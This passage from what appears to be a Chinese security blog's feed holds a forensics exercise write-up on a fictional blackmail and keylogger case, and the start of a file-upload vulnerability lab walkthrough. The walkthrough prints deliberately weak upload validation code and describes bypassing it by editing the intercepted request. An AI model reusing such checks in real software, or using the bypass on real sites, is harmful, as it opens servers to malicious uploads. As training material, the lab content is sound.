        <content type="html"><![CDATA[<p><em>由于版权原因，本文涉及的工具、镜像均不提供下载。</em></p><p>案情信息<br>1.林胜（Victor）是一名三十岁的中学教师。一天，他在家中使用计算机期间，收到一封勒索<br>邮件，其中列出他电子邮件用户名和密码，及其他個人资料，並声称他的用户数据已被窃取，<br>计算机已被入侵。黑客向林胜勒索两个比特币，否则会使用他的个人用户数据作非法用途。<br>林无力支付，于是报警，并向警方提供了他的个人计算机作检验。<br>2.现你被委派对林的计算机进行电子数据取证，还原事件经过。</p><span id="more"></span><p><strong># 单项选择题</strong></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="/images/2020/11/12/fa3a41e9-d2bb-4b07-8a1c-5c9c8cc02b2a.png"><br>取证大师挂载后查看下方摘要可知。<br><img src="/images/2020/11/12/95f31617-cf07-4418-8cea-dd70c4eee36e.png"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="/images/2020/11/12/a1573ccf-2ec9-4c7c-931d-0b6d70d20005.png"><br>显然可知有3个硬盘分区<br><img src="/images/2020/11/12/d0eb2e67-6c5b-4d32-ab9b-ff90ebc563f2.png"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="/images/2020/11/12/fad6957d-95e0-4146-a89e-489e486f6de6.png"><br>通过观察我们发现E盘是系统盘，然后查看摘要可知其开始逻辑区块地址为<strong>32213303296</strong><br><img src="/images/2020/11/12/fa283edf-44cf-4adf-9fe3-887c249b0486.png"><br><img src="/images/2020/11/12/25ba26db-8d5a-46f8-9da0-1bb8851f3159.png"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="/images/2020/11/12/13ca66e7-1433-4337-a930-193825eb1070.png"><br>首先从摘要中可知每个扇区的大小为<strong>512Byte</strong><br><img src="/images/2020/11/12/95f31617-cf07-4418-8cea-dd70c4eee36e.png"><br>然后系统盘共<strong>62,910,464</strong>个分区，再做一下简单的乘法得到物理大小应为<br><strong>32,210,157,568 Byte</strong><br><img src="/images/2020/11/12/25ba26db-8d5a-46f8-9da0-1bb8851f3159.png"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/images/2020/11/12/c6d4ccfa-e94a-4eb2-b9bd-2fbba18bc215.png"><br>通过摘要可知应该是NTFS<br><img src="/images/2020/11/12/25ba26db-8d5a-46f8-9da0-1bb8851f3159.png"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/images/2020/11/12/471a172c-8866-4446-8196-bb1e261ad026.png"><br>把分区挂载为本地磁盘，打开DiskGenius可知一个簇大小为<strong>4096</strong>所以包含8个扇区<br><img src="/images/2020/11/12/c22731e1-6c8e-4cb9-bae6-4590cf0203a5.png"></p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="/images/2020/11/12/27355dc8-6a9c-4bf4-a909-e8d181aa54f7.png"><br>由摘要可知$MFT的物理起始扇区位置是：<br><strong>69,208,064</strong><br><img src="/images/2020/11/12/0744dd59-d99b-4f85-9e59-d435c4d3c1cc.png"></p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><img src="/images/2020/11/12/cf4c7be3-2997-4893-974c-1df33ce3cb15.png"><br>在取证大师中使用搜索找到SOFTWARE并导出<br><img src="/images/2020/11/12/c8fc7948-83c5-4903-94a6-98021e66a771.png"><br>在取证大师的取证结果中找到系统安装时间为<strong>2018-10-25 16:08:39</strong>（UTC+8时间）<br>再减去8h得到UTC时间<strong>2018-10-25 08:08:39</strong><br><img src="/images/2020/11/12/5951001c-e353-4862-af28-e778e52c031e.png"></p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p><img src="/images/2020/11/12/dee2fa07-acbc-4083-85e4-28112da13392.png"><br>在取证大师-&gt;取证结果-&gt;用户信息-&gt;victor 查询可知：<br>Victor的SID为<strong>1001</strong><br><img src="/images/2020/11/12/400a9dda-91c8-4660-a642-30162e19b068.png"></p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><img src="/images/2020/11/12/1c8c0b0d-e63c-4099-9832-ed955e25dcf7.png"><br>在取证大师-&gt;取证结果-&gt;用户信息-&gt;Lily 查询可知：<br>Lily的SID为<strong>1003</strong><br><img src="/images/2020/11/12/f7c32130-8642-4624-929b-71a19b28e72e.png"></p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p><img src="/images/2020/11/12/d1ba64a6-e77d-448e-b5c1-6fed88905e7c.png"><br>在取证大师-&gt;取证结果-&gt;用户信息-&gt;victor 查询可知：<br>victor上次修改密码时间是<strong>2018-10-25 16:08:37 +8</strong><br><img src="/images/2020/11/12/13ea31b3-7d83-4d08-977e-7e84df44d771.png"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><img src="/images/2020/11/12/59d03bff-9c99-4611-90ab-461d90b5c542.png"><br>在取证大师-&gt;取证结果-&gt;用户信息-&gt;Lily 查询可知：<br>Lily上次修改密码时间是<strong>2018-10-30 12:30:40 +8</strong><br><img src="/images/2020/11/12/3fbf988e-9d83-4efb-a09f-52e29062d5f1.png"></p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p><img src="/images/2020/11/12/15c70de1-574a-42df-b318-a9364d3aa289.png"><br>在取证大师-&gt;取证结果-&gt;用户信息-&gt;victor 查询可知：<br>Victor一共登录了36次<br><img src="/images/2020/11/12/ca731177-d156-49f4-92be-4456542b4b4d.png"></p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p><img src="/images/2020/11/12/34cb1eff-0b5d-4a67-89b5-5c53960c4eaf.png"><br>在取证大师-&gt;取证结果-&gt;用户信息 查询可知：<br>Administrator已被禁用<br><img src="/images/2020/11/12/6188dffe-65ea-4104-a7ee-230b28dfb632.png"></p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p><img src="/images/2020/11/12/fc1d09b4-dab5-4972-9349-799072d629c4.png"><br>在取证大师-&gt;取证结果-&gt;用户信息 查询可知：<br>simon属于Guest组，权限最低<br><img src="/images/2020/11/12/0c217239-a285-4c55-a712-9bd1f4b4a894.png"></p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><img src="/images/2020/11/12/79fe4f8c-0bba-44f4-9b63-1bf68c46ff8e.png"><br>在取证大师-&gt;取证结果-&gt;账户登录 中并没有发现有账户远程登录，猜想可能是远程登入已被禁止<br><img src="/images/2020/11/12/52619988-49b5-44ef-8ae1-7619c3d941e7.png"><br>将镜像使用火眼仿真取证挂载得知远程登入被禁止<br><img src="/images/2020/11/12/847ae65a-2916-49ea-a4d1-000532de6ce0.png"></p><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><img src="/images/2020/11/12/0d96e6ee-2e5c-4b9b-a91b-f78a876452a8.png"><br>在取证大师-&gt;取证结果-&gt;系统信息中查询可知<br><img src="/images/2020/11/12/342426ae-7ae7-44c5-b29a-fa4f2d06aa1d.png"></p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><p><img src="/images/2020/11/12/b21cfa42-d8b3-4e7c-9078-b08cf9de9bb2.png"><br>在取证大师-&gt;取证结果-&gt;系统信息中查询可知<br><img src="/images/2020/11/12/40e6688e-9ddc-4976-93a9-00bee20e7237.png"></p><h3 id="19"><a href="#19" class="headerlink" title="19"></a>19</h3><p><img src="/images/2020/11/12/92c447d7-9b71-464b-9615-e56fb7b2a71f.png"><br>使用火眼仿真仿真登录victor账户，打开设备与打印机，可知默认打印机为<strong>CutePDF Writer</strong><br><img src="/images/2020/11/12/11fe09f8-ac2d-44e2-986c-a0a498d2b86b.png"></p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><p><img src="/images/2020/11/12/22614646-62f0-4693-a643-9d9268328057.png"><br>在取证大师-&gt;时间线-&gt;2018-10-31中查找得知simon曾使用<strong>Reddy Resume.doc</strong><br><img src="/images/2020/11/12/1ec57691-f719-4347-be12-85da99dda234.png"></p><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><p><img src="/images/2020/11/12/b861e161-b2da-4801-96e3-d698be7dcba4.png"><br>在取证大师中可知wps曾运行过<br><img src="/images/2020/11/12/5111979e-8058-4849-a4c9-9e4f301817ac.png"><br>打开火眼仿真，运行wps文字得到最近使用的打开记录<br><img src="/images/2020/11/12/7627e59a-6233-484c-b489-422d0278a96f.png"></p><h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><p><img src="/images/2020/11/12/2f1ca13d-0672-4ee1-9822-8f5b0c3127b0.png"><br>使用火眼仿真登录victor账户，打开默认程序可知：<br>victor的默认网页浏览器是<strong>Firefox</strong><br><img src="/images/2020/11/12/e647d6e3-66a9-4ddc-991b-5a84110fc652.png"></p><h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><p><img src="/images/2020/11/12/c9a73937-0260-4334-87c1-8464f9b4cddd.png"><br>在取证大师-&gt;取证结果-&gt;回收站删除记录可知：<br>删除的文件名是<strong>捕获.PNG</strong><br><img src="/images/2020/11/12/ced22d3f-655f-4779-974d-0a80e01cdd80.png"><br>或者打开火眼打开回收站直接看<br><img src="/images/2020/11/12/a9e5f0de-3bfe-4658-bdfd-f2d89388dc64.png"></p><h3 id="24"><a href="#24" class="headerlink" title="24"></a>24</h3><p><img src="/images/2020/11/12/c0816ae6-fc1e-425a-93a4-55c982d84140.png"><br>直接在火眼仿真上把文件还原后可知：<br>文件删除前在桌面上，路径为：<strong>C:\Users\victor\Desktop</strong><br><img src="/images/2020/11/12/86908cc9-e666-4b2e-9a41-2059b4c0a58c.png"><br>在取证大师-&gt;取证结果-&gt;回收站删除记录找到捕获.PNG，右键跳转到源文件<br><img src="/images/2020/11/12/f0898fe8-8066-457e-9240-6426a88fd197.png"><br><img src="/images/2020/11/12/9b22805c-8124-4f0b-90ae-19bc7e62a193.png"><br>后找到同文件名开头为I的文件，在下面预览可知原路径<br><img src="/images/2020/11/12/c5377977-d5cb-4730-8efa-742142aac08b.png"></p><h3 id="25"><a href="#25" class="headerlink" title="25"></a>25</h3><p><img src="/images/2020/11/12/8cbd1a42-8ecd-461f-864b-0f4ce3da4766.png"><br>在取证大师-&gt;搜索-&gt;request for quotation.lnk-&gt;系统痕迹-&gt;快捷方式解析 可知：<br>目标路径是：<strong>C:\Users\victor\Desktop</strong><br><img src="/images/2020/11/12/29458c96-be73-4364-8cb4-509168dd9b0f.png"></p><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><p><img src="/images/2020/11/12/b8668ec9-7af5-4199-ba29-1e59bb0d4d79.png"><br>在取证大师-&gt;搜索-&gt;request for quotation.lnk-&gt;证据文件-&gt;命中文件名 可知：<br>上一次开启时间是： <strong>2018-11-01 14:51:25 +8</strong><br><img src="/images/2020/11/12/a53d3f3d-5874-422c-9a20-780f9d0da3f1.png"></p><h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><p><img src="/images/2020/11/12/3f49ecb4-220c-4f8d-9b96-b247bbf81f1c.png"><br>在取证大师-&gt;搜索-&gt;request for quotation.lnk-&gt;系统痕迹-&gt;快捷方式解析 可知：<br>mac address是：<strong>E4:A7:A0:CB:66:C7</strong><br><img src="/images/2020/11/12/ead3c9d0-5ef4-40c1-9d2c-e65deffca677.png"></p><h3 id="28"><a href="#28" class="headerlink" title="28"></a>28</h3><p><img src="/images/2020/11/12/9a5276be-94b9-49b0-bbca-907440ccd04f.png"><br>在取证大师-&gt;取证结果-&gt;邮件解析可知：<br>使用的是<strong>Mozilla Thunderbird</strong><br><img src="/images/2020/11/12/d60ea44a-9b30-4e8a-b421-e9dff4e91a3c.png"></p><h3 id="29"><a href="#29" class="headerlink" title="29"></a>29</h3><p><img src="/images/2020/11/12/f238127c-47a6-41ab-94ee-671c69d12ea6.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;系统信息-&gt;网络配置-&gt;网络连接 可知<br>系统经<strong>192.168.72.128</strong>联网<br><img src="/images/2020/11/12/4ab14f89-6e6a-4e9b-bd7c-2e190740cb33.png"></p><h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><p><img src="/images/2020/11/12/0d1993b4-4b3e-4ddc-9066-17a71cd8d95d.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;USB设备使用痕迹 可知<br>系统曾连接过<strong>SanDisk Cruzer Fit USB Device</strong><br><img src="/images/2020/11/12/866cc42f-d8ab-42a3-bc67-7f9f7fab29f5.png"></p><h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><p><img src="/images/2020/11/12/c33ce86f-cb8c-47c5-bfe2-dd0aa8c47406.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;USB设备使用痕迹 可知<br>SanDisk Cruzer Fit USB Device挂载的盘符是<strong>F盘</strong><br><img src="/images/2020/11/12/ebd7bd9f-e907-465c-93f6-d5bc8b59fe4c.png"></p><h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p><img src="/images/2020/11/12/b09858d1-054c-426c-9ec6-cbdd95802ab9.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;系统信息 查得最后一次关机时间是2018-11-02 18:47:51 UTC +8 所以系统最后一次关机时间是：<br><strong>2018-11-02 10:47:51</strong><br><img src="/images/2020/11/12/3897c9c3-0a27-48b5-9c99-4673031e8836.png"></p><h3 id="33"><a href="#33" class="headerlink" title="33"></a>33</h3><p><img src="/images/2020/11/12/b13df552-c283-47f1-9024-153b4ee36d44.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;系统信息 查得计算机主机名为：<br><strong>VICTOR-HOME</strong><br><img src="/images/2020/11/12/cad3d382-f264-4d60-bcef-4475d200b942.png"></p><h3 id="34"><a href="#34" class="headerlink" title="34"></a>34</h3><p><img src="/images/2020/11/12/5dc14a95-5e59-4ece-8306-523d73ba4351.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;系统时间更改 可找到之前的名称是：<br><strong>WIN-6S2GC51RGL9</strong><br><img src="/images/2020/11/12/081d571b-2c40-45f9-bdb5-e7ba205d88df.png"></p><h3 id="35"><a href="#35" class="headerlink" title="35"></a>35</h3><p><img src="/images/2020/11/12/60d72887-9a85-4f79-a7bd-569caf8473e4.png"><br>在取证大师中搜索查看日志可知WIN-6S2GC51RGL9更改为VICTOR-HOME的时间是：<br><strong>2018-10-25 16:07:38 +8</strong><br><img src="/images/2020/11/12/1f35d011-f1d6-4c78-826c-59635007d2d3.png"></p><h3 id="36"><a href="#36" class="headerlink" title="36"></a>36</h3><p><img src="/images/2020/11/12/d33e096e-0378-49f7-ac58-8340170a1371.png"><br>在取证大师-&gt;取证结果-&gt;邮件解析 可知victor日常使用的电邮账号是：<br><strong><a href="mailto:&#118;&#x69;&#99;&#116;&#x6f;&#114;&#x32;&#x30;&#x31;&#x38;&#x31;&#49;&#64;&#x68;&#111;&#x74;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#118;&#x69;&#99;&#116;&#x6f;&#114;&#x32;&#x30;&#x31;&#x38;&#x31;&#49;&#64;&#x68;&#111;&#x74;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a></strong><br><img src="/images/2020/11/12/9d8fad12-b72e-4521-a71c-4a0bc913066d.png"></p><h3 id="37-疑似答案错误）"><a href="#37-疑似答案错误）" class="headerlink" title="37(疑似答案错误）"></a>37(疑似答案错误）</h3><p><img src="/images/2020/11/12/1f076001-9982-48c0-bc6c-6d6ea1193ce5.png"><br>在取证大师-&gt;取证结果-&gt;邮件解析 可知<a href="mailto:&#x76;&#105;&#99;&#x74;&#111;&#114;&#50;&#x30;&#49;&#56;&#49;&#x31;&#64;&#104;&#111;&#x74;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#109;">&#x76;&#105;&#99;&#x74;&#111;&#114;&#50;&#x30;&#49;&#56;&#49;&#x31;&#64;&#104;&#111;&#x74;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#109;</a>最后一次更改密码时间是：<br><strong>2018-10-31</strong>选 <strong>C</strong><br><img src="/images/2020/11/12/b18ca19f-de97-4980-b36f-09f3eb54fbaf.png"></p><h3 id="38"><a href="#38" class="headerlink" title="38"></a>38</h3><p><img src="/images/2020/11/12/f70a68a9-b79a-4419-8360-ab487e67df44.png"><br>在取证大师-&gt;取证结果-&gt;邮件解析 可知victor收到勒索电邮的时间是：<br><strong>2018-11-02 17:09 +8</strong><br><img src="/images/2020/11/12/30f99556-db2b-4982-a81b-7b17d33b2f7f.png"></p><h3 id="39"><a href="#39" class="headerlink" title="39"></a>39</h3><p><img src="/images/2020/11/12/ba0249cf-9822-4ee4-9dce-9915dc10f4bc.png"><br>在取证大师-&gt;取证结果-&gt;邮件解析 可知发件人IP为<br><strong>220.246.55.13</strong><br><img src="/images/2020/11/12/d2c65612-2e2b-421e-9910-79969301b119.png"></p><h3 id="40"><a href="#40" class="headerlink" title="40"></a>40</h3><p><img src="/images/2020/11/12/88d1b194-2b7d-41a1-a64d-2a8085417b1b.png"><br>将文件导出后计算MD5值为：<br><strong>15B64B15CC5A5442196471690D4A088B</strong><br><img src="/images/2020/11/12/42d2ced6-0b7a-41bd-abdd-0a72fb1901f4.png"></p><h3 id="41"><a href="#41" class="headerlink" title="41"></a>41</h3><p><img src="/images/2020/11/12/24559caa-cb24-41bb-a306-c8cfc191dd61.png"><br>查询时间线后发现在<strong>2018-11-02 17:13 +8</strong>病毒文件被执行<br><img src="/images/2020/11/13/213646c8-9ee7-407a-9eb1-e6da62ec7299.png"></p><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p><img src="/images/2020/11/13/37d1ce2f-6851-432a-97b3-e6a2ab04113a.png"><br>会开机自启动，通过<strong>javaw.exe</strong>执行<br><img src="/images/2020/11/13/5647c7b7-131d-4423-a2a7-c8801b2be2ea.png"></p><h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><p><img src="/images/2020/11/13/9210f37e-aa82-4ef4-a2f9-f15bd94b740e.png"><br>查询时间线后发现，在运行病毒后生成了：<br><strong>JNativeHook_4940080920928265976</strong><br><img src="/images/2020/11/13/051bb655-5d1e-4f98-8975-31836b2f524b.png"></p><h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p><img src="/images/2020/11/13/cb059dbb-dc9d-4e76-b055-9bf72ea9ecd1.png"><br>导出该dll，丢入winhex里细品，发现函数org.jnativehook.keyboard.NativeKeyEvent功能应该是<strong>追踪键盘记录</strong><br>还发现函数org.jnativehook.mouse.NativeMouseEvent，其功能是对鼠标记录<br><img src="/images/2020/11/13/259c1ad2-ca6b-44d9-a3db-80c9251c2e20.png"></p><h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p><img src="/images/2020/11/13/e0f6c246-b942-4d68-9bdd-bdc7004d0fe5.png"><br>在取证大师-&gt;取证结果-&gt;系统痕迹-&gt;安装软件 中发现安装的输入法是：<br><strong>搜狗拼音</strong><br><img src="/images/2020/11/13/f4ff5571-f382-4eac-a200-b28a546e0e0c.png"></p><h3 id="46"><a href="#46" class="headerlink" title="46"></a>46</h3><p><img src="/images/2020/11/13/ddd7a4c3-cc85-471d-9953-a90de27a0bea.png"><br>打开火眼仿真可知，操作系统自动和<strong>time.windos.com</strong>自动同步<br><img src="/images/2020/11/13/3b2b8a89-c893-4457-a6f0-e2ac3078e4ed.png"></p><h3 id="47"><a href="#47" class="headerlink" title="47"></a>47</h3><p><img src="/images/2020/11/13/22d7c2b7-8c65-4a47-a9ca-a7aaa809a669.png"><br>由48题可知，法政人员做了<strong>制作内存镜像档</strong></p><h3 id="48"><a href="#48" class="headerlink" title="48"></a>48</h3><p><img src="/images/2020/11/13/86595d97-da23-4e92-b986-b740f75d9610.png"><br>取证大师查看应用程序访问记录得知运行了<strong>Magnet RAM capture.exe</strong><br><img src="/images/2020/11/13/f019963b-4d07-480e-8de9-7974ccf65df8.png"></p><h3 id="49"><a href="#49" class="headerlink" title="49"></a>49</h3><p><img src="/images/2020/11/13/38de85e6-7318-4554-b9db-a014caa4be03.png"><br>查询时间线,发现储存为：<strong>victor_PC_memdump.dmp</strong><br><img src="/images/2020/11/13/bf8c04ad-bddc-4481-9c2a-221a1f8e6fa0.png"></p><h3 id="50"><a href="#50" class="headerlink" title="50"></a>50</h3><p><img src="/images/2020/11/13/1b07a20d-aa1d-4168-824c-2a4cdc766509.png"><br>查询后得知归档于<strong>F盘</strong><br><img src="/images/2020/11/13/76d07fc1-a534-4192-98db-cf206348d3d2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电子取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞总结</title>
      <link href="/2020/07/13/wen-jian-shang-chuan-lou-dong-zong-jie/"/>
      <url>/2020/07/13/wen-jian-shang-chuan-lou-dong-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>对各种基本文件上传漏洞进行总结</p><span id="more"></span><h2 id="0x01-PASS-01"><a href="#0x01-PASS-01" class="headerlink" title="0x01  PASS-01"></a>0x01  PASS-01</h2><hr><p>pass-01源代码： </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>通过查看源代码发现该题目为前端校验，只需要抓包后更改文件后缀即可。</p><p><img src="/images/2024/08/22/00eacfa4-1378-4d0e-9c4d-f1d77c781588.jpg"><br><img src="/images/2024/08/22/5b28e2bc-9170-41fd-bbff-184da25d9a72.jpg"></p><p>成功。</p><h2 id="0x02-PASS-02"><a href="#0x02-PASS-02" class="headerlink" title="0x02  PASS-02"></a>0x02  PASS-02</h2><hr><p>pass-02源代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$UPLOAD_ADDR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$UPLOAD_ADDR</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>分析可知：本题为Content-Type和文件头检测，与第一题类似。</p><p><img src="/images/2024/08/22/ff9936fa-1e1d-46bb-a9f0-eeab32d05893.jpg"><br><img src="/images/2024/08/22/fd167b92-ead0-4a8f-a6ea-ca84d23a4057.jpg"></p><p>成功。</p><h2 id="0x03-PASS-03"><a href="#0x03-PASS-03" class="headerlink" title="0x03  PASS-03"></a>0x03  PASS-03</h2><hr>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL显错注入</title>
      <link href="/2020/06/26/mysql-xian-cuo-zhu-ru/"/>
      <url>/2020/06/26/mysql-xian-cuo-zhu-ru/</url>
      
